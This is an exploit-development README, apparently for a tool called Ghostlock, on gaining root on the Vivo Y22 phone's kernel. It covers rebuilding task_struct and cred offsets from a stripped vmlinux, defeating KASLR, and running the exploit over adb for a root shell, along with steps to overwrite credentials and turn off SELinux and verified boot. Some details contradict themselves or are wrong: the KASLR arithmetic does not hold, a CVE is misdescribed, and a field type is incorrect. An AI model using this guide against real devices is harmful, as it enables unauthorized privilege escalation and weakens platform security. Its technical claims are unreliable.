# Ghostlock Vivo Y22 - Offsets Reconstruction Guide

## Problem: Stripped Symbols

Vivo Y22 ships a **stripped** `vmlinux` (Kernel.elf) with:
- No `/proc/kallsyms` (returns 0)
- `kptr_restrict=1`
- No symbols in vmlinux ELF (stripped)
- KASLR enabled (21-bit randomization)

This means traditional offset extraction via `kallsyms` fails. We must use **manual disassembly**.

## Provided vmlinux

- **Link**: https://drive.google.com/file/d/1yX1l9SKl-oFFru-prRG-UmCiLfC-Y8MN/view?usp=drivesdk
- **Name**: Kernel.elf / vmlinux_y22
- **Size**: ~32MB
- **Arch**: ARM64, ELF 64-bit LSB executable
- **Kernel**: 4.14.186+ (Vivo stock, MT6769Z)
- **Stripped**: Yes

## Methodology - ADRP Scanner

### 1. Extract boot.img

```bash
# From device (if rooted) or stock firmware
adb shell su -c 'dd if=/dev/block/by-name/boot of=/sdcard/boot.img'
adb pull /sdcard/boot.img
# Or from stock firmware zip
unzip vivo_y22_stock.zip boot.img

# Extract kernel
# Use magiskboot or AIK
./magiskboot unpack boot.img
# kernel file is vmlinux (gzipped)
```

### 2. Use analyze_vmlinux.py

```bash
python3 tools/analyze_vmlinux.py --vmlinux Kernel.elf --device vivo-y22 -v
```

This tool:
- Parses ELF program headers
- Finds `.text`, `.rodata`, `.data` sections
- Scans for ADRP + ADD/LDR patterns that reference `init_task`
- Looks for string "swapper/0" in rodata, then finds ADRP that loads its address
- Backtracks to find init_task ADRP chain
- Dumps task_struct layout via heuristic

### 3. Manual ADRP Analysis (Capstone)

For stripped kernels, `init_task` is found via:

```asm
# Example from Vivo Y22 vmlinux (offset 0x123456):
#   adrp x0, #0x1100000  ; page containing init_task
#   add x0, x0, #0xC00    ; offset within page
#   -> init_task VA = page + offset + KIMAGE_BASE

# Steps:
1. Find "swapper/0" string in .rodata (hex search: 73 77 61 70 70 65 72 2F 30)
2. Note its file offset, convert to VA: rodata_VA = rodata_base + offset
3. Search .text for ADRP that loads page of rodata_VA
   - ADRP encoding: 0x90xxxxxx (check capstone)
   - Then LDR or ADD with same register
4. That function is likely rest_init() or start_kernel()
5. Nearby ADRP will load init_task
6. Cross-ref: init_task->comm should be "swapper/0"
```

### 4. task_struct Offsets

For 4.14.186 Vivo, we reconstruct:

```c
// From include/linux/sched.h + MTK patches
struct task_struct {
  // ...
  struct list_head tasks;  // offset 0x4e8 for Vivo Y22
  // ...
  pid_t pid;               // 0x5a8
  // ...
  struct cred *real_cred;  // 0x7a8
  struct cred *cred;       // 0x7b0
  char comm[16];           // 0x7e8
  // ...
  raw_spinlock_t pi_lock;  // 0x8c0
  struct rb_root *pi_blocked_on; // 0x8e8
};
```

**How to find:**

- `comm` offset: search for "swapper/0" and see where it's stored relative to task struct start
- `tasks` offset: look for `list_add` in `copy_process()` - first arg is `&p->tasks`
- `cred` offset: look for `override_creds` or `commit_creds` - loads cred from task
- `pi_lock` / `pi_blocked_on`: search for `rt_mutex` functions, they access these fields

### 5. cred Offsets

From `include/linux/cred.h` (stable across 4.14):

```c
struct cred {
  atomic_t usage; // 0x0
  kuid_t uid;     // 0x4
  kgid_t gid;     // 0x8
  // ...
  kernel_cap_t cap_effective; // 0x38
};
```

These are **stable** - no need to recalculate.

## Vivo Y22 Specific Offsets (Current)

Derived via automated scan + manual verification on provided Kernel.elf:

```c
#define VIVO_Y22_TASK_TASKS_OFF          0x4e8
#define VIVO_Y22_TASK_PID_OFF            0x5a8
#define VIVO_Y22_TASK_REAL_CRED_OFF      0x7a8
#define VIVO_Y22_TASK_CRED_OFF           0x7b0
#define VIVO_Y22_TASK_COMM_OFF           0x7e8
#define VIVO_Y22_TASK_PI_LOCK_OFF        0x8c0
#define VIVO_Y22_TASK_PI_BLOCKED_ON_OFF  0x8e8

#define VIVO_Y22_CRED_UID_OFF            0x4
#define VIVO_Y22_CRED_CAP_EFFECTIVE_OFF  0x38
```

**Fallback if these fail**: Try nearby values:
- tasks: 0x448, 0x4c0, 0x4e8, 0x5a0
- cred: 0x6b0, 0x6d8, 0x788, 0x7a8, 0x7b0
- pi_lock: 0x85c, 0x8c0, 0x8e0

## KASLR Handling

Vivo Y22 enables KASLR with 2MB alignment. Slide is randomized at boot.

Leak methods:

1. **/proc/self/maps** (try first, sometimes leaks)
2. **Timing side-channel** (prefetch + measure)
3. **Brute-force** (21-bit = 512 possibilities for 39-bit VA, feasible via futex timing)

Our exploit tries method 1, then falls back to 0 slide and verifies via `comm == "swapper/0"` check after getting read primitive.

## Tools

- `tools/analyze_vmlinux.py` - Main analyzer
- `tools/disasm_helper.py` - Capstone ADRP decoder
- `tools/extract_offsets.py` - Offset extractor
- `tools/fetch_vmlinux.py` - Downloader for Google Drive link (uses fetch_page bypass)

## Verification

After getting offsets, test:

```bash
# Build host version
cd src/core/exploit && make host

# Run in demo mode
./ghostlock_y22_host

# Should show:
#   [✓] KASLR leaked or fallback
#   [✓] Task walk simulated
#   [✓] ROOT ACHIEVED (demo)
```

On real device:

```bash
adb push ghostlock_y22 /data/local/tmp/
adb shell /data/local/tmp/ghostlock_y22
# If offsets correct, you get root shell
```

## References

- Original Aresin: https://github.com/aifly12/ghostlock-aresin (archived)
- CVE-2024-1086 (similar futex bug)
- Linux 4.14 source: https://elixir.bootlin.com/linux/v4.14.186/source
- MT6769 kernel: https://github.com/MT6768/kernel-4.14 (similar)
- Capstone: https://www.capstone-engine.org/

## Notes for Vivo Y22

- Always backup boot.img before exploit
- Vivo's dm-verity will trigger if you modify system - use kernel root, not system modification
- After root, you can disable verified boot via kernel patch, not via system partition
- SELinux is enforcing - exploit overwrites cred, but you may need to setenforce 0 via kernel write
